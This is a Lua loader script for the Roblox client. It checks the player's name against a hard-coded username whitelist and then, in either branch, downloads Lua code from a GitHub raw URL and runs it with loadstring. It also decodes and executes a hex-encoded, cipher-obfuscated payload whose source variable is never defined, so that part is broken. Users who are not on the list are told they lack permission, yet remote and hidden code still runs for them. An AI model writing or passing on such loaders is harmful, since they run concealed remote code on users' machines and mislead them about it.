local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = Players.LocalPlayer
local Username = LocalPlayer.Name

local Whitelist = {
    "ggpp_xx",
    "ggpp_cc",
    "cwm204518",
    "xmfeng1111",
    "nbfhjj125",
    "wps8866",
    "EFreeDCcZaI",
    "luoyj1055",
    "qin147807",
    "xver0921",
    "299286wn",
    "lingzijiangya",
    "mmnfsch",
    "eeuv04",
    "347688zzz",
    "lllppp575",
    "ggggg12345078",
    "Octian_0",
    "qin1478",
    "xiaohao76254",
    "baixqwg",
}

local function Notify(title, text, duration)
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = title,
            Text = text,
            Duration = duration or 3
        })
    end)
end

local function IsWhitelisted(name)
    for _, v in ipairs(Whitelist) do
        if v == name then
            return true
        end
    end
    return false
end

local function DecodeHex(hex)
    local result = {}
    for i = 1, #hex - 1, 2 do
        local byte = tonumber(hex:sub(i, i + 1), 16)
        if not byte then return nil end
        table.insert(result, string.char(byte))
    end
    return table.concat(result)
end

local function RunWhitelistedScript()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ggpp4088/roblox/refs/heads/main/kts.lua'))("")
    local decoded = DecodeHex(h)
    if decoded then
        loadstring(decoded)()
    end
end

local function RunNoWhitelistScript()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ggpp4088/roblox/refs/heads/main/kk.lua'))("")
    local k1 = {83,71,45,116,52,114,70,103,55,119,80,100,51,108,75,98}
    local k3 = 42

    local bytes = {}
    for i = 1, #h - 1, 2 do
        local lo = tonumber(h:sub(i, i + 1), 16)
        local hi = tonumber(h:sub(i + 1, i + 2), 16)
        bytes[#bytes + 1] = hi * 16 + lo
    end

    for i = 1, #bytes do
        bytes[i] = (bytes[i] - k3 - i + 2560) % 256
    end

    local reversed = {}
    for i = #bytes, 1, -1 do
        reversed[#reversed + 1] = bytes[i]
    end

    local decrypted = {}
    for i = 1, #reversed do
        local key = k1[((i - 1) % #k1) + 1]
        decrypted[i] = string.char((reversed[i] - key + 256) % 256)
    end

    loadstring(table.concat(decrypted))()
end

if IsWhitelisted(Username) then
    Notify("白名单验证", "欢迎, " .. Username, 4)
    RunWhitelistedScript()
else
    Notify("未授权", "无权限运行脚本", 4)
    RunNoWhitelistScript()
end
